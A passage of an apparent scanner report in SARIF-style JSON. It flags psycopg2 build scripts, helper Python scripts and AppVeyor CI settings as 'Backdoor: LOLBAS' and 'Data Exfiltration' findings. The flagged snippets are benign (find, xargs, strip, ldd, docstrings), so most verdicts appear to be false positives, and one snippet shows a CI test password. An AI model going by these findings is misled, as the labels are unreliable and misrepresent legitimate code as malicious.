                      "text": "\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n",
                      "markdown": "`\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/print_so_versions.sh"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 57,
                  "endLine": 15,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n",
                    "rendered": {
                      "text": "\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n",
                      "markdown": "`\ncase \"$ID\" in\n    alpine)\n        depfiles=$( (ldd \"$sofile\" 2>/dev/null || true) | grep '=>' | sed 's/.*=> \\(.*\\) (.*)/\\1/')\n        (for depfile in $depfiles; do\n             echo \"$(basename \"$depfile\") => $(apk info --who-owns \"${depfile}\" | awk '{print $(NF)}')\"\n        done) | sort | uniq\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 76,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Stripping symbols is beneficial (reduction of 30% of the final package, >\n# %90% of the installed libraries. However just running `auditwheel repair\n# --strip` breaks some of the libraries included from the system, which fail at\n# import with errors such as \"ELF load command address/offset not properly\n# aligned\".\n#\n# System libraries are already pretty stripped. _psycopg2.so goes around\n",
                    "rendered": {
                      "text": "#\n# Stripping symbols is beneficial (reduction of 30% of the final package, >\n# %90% of the installed libraries. However just running `auditwheel repair\n# --strip` breaks some of the libraries included from the system, which fail at\n# import with errors such as \"ELF load command address/offset not properly\n# aligned\".\n#\n# System libraries are already pretty stripped. _psycopg2.so goes around\n",
                      "markdown": "`#\n# Stripping symbols is beneficial (reduction of 30% of the final package, >\n# %90% of the installed libraries. However just running `auditwheel repair\n# --strip` breaks some of the libraries included from the system, which fail at\n# import with errors such as \"ELF load command address/offset not properly\n# aligned\".\n#\n# System libraries are already pretty stripped. _psycopg2.so goes around\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 20,
                  "endLine": 45,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n",
                    "rendered": {
                      "text": "\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n",
                      "markdown": "`\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 12,
                  "endLine": 45,
                  "endColumn": 5,
                  "snippet": {
                    "text": "find . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n",
                    "rendered": {
                      "text": "find . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n",
                      "markdown": "`find . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\nfind . -name \\*.so | xargs ls -l\n\npython -m zipfile -c ${wheel} *\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 40,
                  "endLine": 41,
                  "endColumn": 5,
                  "snippet": {
                    "text": "echo \"\nDependencies versions of '_psycopg.so' library:\"\n\"${dir}/print_so_versions.sh\" \"$(find . -name \\*_psycopg\\*.so)\"\n\nfind . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\n",
                    "rendered": {
                      "text": "echo \"\nDependencies versions of '_psycopg.so' library:\"\n\"${dir}/print_so_versions.sh\" \"$(find . -name \\*_psycopg\\*.so)\"\n\nfind . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\n",
                      "markdown": "`echo \"\nDependencies versions of '_psycopg.so' library:\"\n\"${dir}/print_so_versions.sh\" \"$(find . -name \\*_psycopg\\*.so)\"\n\nfind . -name \\*.so -exec strip \"$@\" {} \\;\n\necho \"\nLibs after:\"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 20,
                  "endLine": 34,
                  "endColumn": 27,
                  "snippet": {
                    "text": "echo \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n",
                    "rendered": {
                      "text": "echo \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n",
                      "markdown": "`echo \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 33,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n",
                    "rendered": {
                      "text": "\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n",
                      "markdown": "`\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\necho \"\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 1,
                  "endLine": 33,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\n",
                    "rendered": {
                      "text": "\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\n",
                      "markdown": "`\necho \"\nLibs before:\"\n# Busybox doesn't have \"find -ls\"\nfind . -name \\*.so | xargs ls -l\n\n# On Debian, print the package versions libraries come from\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/strip_wheel.sh"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 6,
                  "endLine": 14,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# System libraries are already pretty stripped. _psycopg2.so goes around\n# 1.6M -> 300K (python 3.8, x86_64)\n#\n# This script is designed to run on a wheel archive before auditwheel.\n\nset -euo pipefail\n# set -x\n",
                    "rendered": {
                      "text": "# System libraries are already pretty stripped. _psycopg2.so goes around\n# 1.6M -> 300K (python 3.8, x86_64)\n#\n# This script is designed to run on a wheel archive before auditwheel.\n\nset -euo pipefail\n# set -x\n",
                      "markdown": "`# System libraries are already pretty stripped. _psycopg2.so goes around\n# 1.6M -> 300K (python 3.8, x86_64)\n#\n# This script is designed to run on a wheel archive before auditwheel.\n\nset -euo pipefail\n# set -x\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/refcounter.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 79,
                  "endLine": 6,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n\n# Copyright (C) 2011-2019 Daniele Varrazzo <daniele.varrazzo@gmail.com>\n",
                    "rendered": {
                      "text": "\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n\n# Copyright (C) 2011-2019 Daniele Varrazzo <daniele.varrazzo@gmail.com>\n",
                      "markdown": "`\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n\n# Copyright (C) 2011-2019 Daniele Varrazzo <daniele.varrazzo@gmail.com>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/refcounter.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3,
                  "endLine": 4,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#!/usr/bin/env python\n\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n",
                    "rendered": {
                      "text": "#!/usr/bin/env python\n\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n",
                      "markdown": "`#!/usr/bin/env python\n\"\"\"Detect reference leaks after several unit test runs.\n\nThe script runs the unit test and counts the objects alive after the run. If\nthe object count differs between the last two runs, a report is printed and the\nscript exits with error 1.\n\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errorcodes.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 21,
                  "endLine": 4,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                    "rendered": {
                      "text": "#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                      "markdown": "`#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errorcodes.py"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 18,
                  "endLine": 86,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n",
                    "rendered": {
                      "text": "            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n",
                      "markdown": "`            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errorcodes.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 27,
                  "endLine": 54,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        if line.startswith(\"# autogenerated\"):\n            return rv\n\n    raise ValueError(\"can't find the separator. Is this the right file?\")\n\n\ndef parse_errors_txt(url):\n",
                    "rendered": {
                      "text": "        if line.startswith(\"# autogenerated\"):\n            return rv\n\n    raise ValueError(\"can't find the separator. Is this the right file?\")\n\n\ndef parse_errors_txt(url):\n",
                      "markdown": "`        if line.startswith(\"# autogenerated\"):\n            return rv\n\n    raise ValueError(\"can't find the separator. Is this the right file?\")\n\n\ndef parse_errors_txt(url):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errorcodes.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3,
                  "endLine": 4,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                    "rendered": {
                      "text": "#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                      "markdown": "`#!/usr/bin/env python3\n\"\"\"Generate the errorcodes module starting from PostgreSQL documentation.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2010-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errors.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 21,
                  "endLine": 4,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                    "rendered": {
                      "text": "#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                      "markdown": "`#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errors.py"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 18,
                  "endLine": 70,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n",
                    "rendered": {
                      "text": "            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n",
                      "markdown": "`            errors[class_][errcode] = errlabel\n            continue\n\n        # We don't expect anything else\n        raise ValueError(f\"unexpected line:\\n{line}\")\n\n    return classes, errors\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/make_errors.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3,
                  "endLine": 4,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                    "rendered": {
                      "text": "#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n",
                      "markdown": "`#!/usr/bin/env python3\n\"\"\"Generate the errors module from PostgreSQL source code.\n\nThe script can be run at a new PostgreSQL release to refresh the module.\n\"\"\"\n\n# Copyright (C) 2018-2019 Daniele Varrazzo  <daniele.varrazzo@gmail.com>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 1,
                  "endLine": 61,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n",
                    "rendered": {
                      "text": "  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n",
                      "markdown": "`  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 28,
                  "endLine": 53,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n",
                    "rendered": {
                      "text": "  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n",
                      "markdown": "`  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 27,
                  "endLine": 43,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n",
                    "rendered": {
                      "text": "  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n",
                      "markdown": "`  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 14,
                  "endLine": 40,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n",
                    "rendered": {
                      "text": "  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n",
                      "markdown": "`  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 14,
                  "endLine": 37,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                    "rendered": {
                      "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                      "markdown": "`  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
